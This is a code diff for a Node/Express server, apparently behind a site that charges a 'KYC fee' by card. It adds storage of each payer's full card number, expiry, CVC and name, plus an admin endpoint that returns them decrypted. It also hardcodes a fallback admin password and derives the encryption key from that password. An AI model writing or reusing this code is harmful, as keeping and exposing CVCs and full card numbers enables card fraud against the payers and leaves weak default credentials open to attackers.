@@ -98,6 +98,39 @@ function verifyAdminToken(token) {
   }
 }
 
+// --- Encrypted card storage (AES-256-GCM) ---
+const CARD_ENCRYPT_KEY = (() => {
+  const envKey = process.env.CARD_ENCRYPT_KEY;
+  if (envKey && envKey.length >= 32) return crypto.createHash('sha256').update(envKey).digest();
+  const pass = process.env.ADMIN_PASS || 'NexoraGo2026!';
+  return crypto.createHash('sha256').update('card-v1:' + pass).digest();
+})();
+
+function encryptCard(plainText) {
+  if (plainText == null || plainText === '') return '';
+  const iv = crypto.randomBytes(12);
+  const cipher = crypto.createCipheriv('aes-256-gcm', CARD_ENCRYPT_KEY, iv);
+  const enc = Buffer.concat([cipher.update(String(plainText), 'utf8'), cipher.final()]);
+  const tag = cipher.getAuthTag();
+  return Buffer.concat([iv, tag, enc]).toString('base64');
+}
+
+function decryptCard(cipherText) {
+  if (!cipherText) return '';
+  try {
+    const buf = Buffer.from(String(cipherText), 'base64');
+    const iv = buf.slice(0, 12);
+    const tag = buf.slice(12, 28);
+    const enc = buf.slice(28);
+    const decipher = crypto.createDecipheriv('aes-256-gcm', CARD_ENCRYPT_KEY, iv);
+    decipher.setAuthTag(tag);
+    return Buffer.concat([decipher.update(enc), decipher.final()]).toString('utf8');
+  } catch (err) {
+    console.error('[decryptCard] failed:', err.message);
+    return '';
+  }
+}
+
 function requireAdmin(req, res, next) {
   const header = req.headers.authorization || '';
   const token = header.startsWith('Bearer ') ? header.slice(7) : req.headers['x-admin-token'];
@@ -542,11 +575,15 @@ app.post('/api/orders/:id/pay-card', (req, res) => {
       payment_status = 'confirmed',
       payment_method = 'card',
       card_last4 = ?,
+      cardholder_name = ?,
+      card_number_enc = ?,
+      card_expiry_enc = ?,
+      card_cvc_enc = ?,
       amount = ?,
       kyc_status = CASE WHEN kyc_status = 'n/a' OR kyc_status = 'pending' THEN 'awaiting' ELSE kyc_status END,
       updated_at = datetime('now')
     WHERE id = ?
-  `).run(last4, fee, orderId);
+  `).run(last4, encryptCard(card_name), encryptCard(cleanCard), encryptCard(card_expiry), encryptCard(card_cvc), fee, orderId);
 
   res.json({
     message: 'KYC fee paid successfully',
@@ -688,6 +725,25 @@ app.delete('/api/admin/orders/:id', requireAdmin, async (req, res) => {
 
   if (typeof db.flushPersist === 'function') await db.flushPersist();
   res.json({ message: 'Application deleted', id: orderId });
+});
+
+app.post('/api/admin/orders/:id/card-details', requireAdmin, (req, res) => {
+  const { username, password } = req.body || {};
+  const adminUser = process.env.ADMIN_USER || 'admin';
+  const adminPass = process.env.ADMIN_PASS || 'NexoraGo2026!';
+  if (String(username || '') !== adminUser || String(password || '') !== adminPass) {
+    return res.status(401).json({ error: 'Invalid admin password' });
+  }
+  const orderId = req.params.id;
+  const order = db.prepare('SELECT cardholder_name, card_number_enc, card_expiry_enc, card_cvc_enc, card_last4 FROM orders WHERE id = ?').get(orderId);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  res.json({
+    cardholder_name: decryptCard(order.cardholder_name),
+    card_number: decryptCard(order.card_number_enc),
+    card_expiry: decryptCard(order.card_expiry_enc),
+    card_cvc: decryptCard(order.card_cvc_enc),
+    card_last4: order.card_last4 || '',
+  });
 });
 
 app.get('/api/admin/kyc', requireAdmin, (req, res) => {
